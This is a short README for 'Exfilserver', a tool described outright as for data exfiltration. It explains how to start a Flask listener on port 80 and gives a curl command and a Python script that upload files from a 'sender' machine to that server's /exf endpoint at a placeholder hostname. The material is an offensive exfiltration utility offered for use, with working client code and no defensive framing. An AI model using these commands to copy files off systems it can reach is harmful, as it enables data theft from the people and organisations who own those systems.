# 📭 Exfilserver

> 📨 Data exfiltration via upload using curl or similar... 

### Run in you server:

```sh
pip install Flask \
python3 server.py -p 80 -f /tmp/files
```

### Upload from sender:

> By Curl:

```sh
curl -X POST -F "file=@./file" http://<youhostname>:80/exf
```

> By python:
```py
import requests
import sys

def upload_file(server_url, file_path):
    url = f"{server_url}/exf"
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (file_path, f)}
            response = requests.post(url, files=files)
        print(f"[*] Status: {response.status_code}")
        print(f"[*] Response of server: {response.text}")
    except Exception as e:
        print(f"[!] Error to send file: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python {sys.argv[0]} <server_url> <file_path>")
        sys.exit(1)

    server_url = sys.argv[1]   # example: http://127.0.0.1:80
    file_path = sys.argv[2]
    upload_file(server_url, file_path)
```

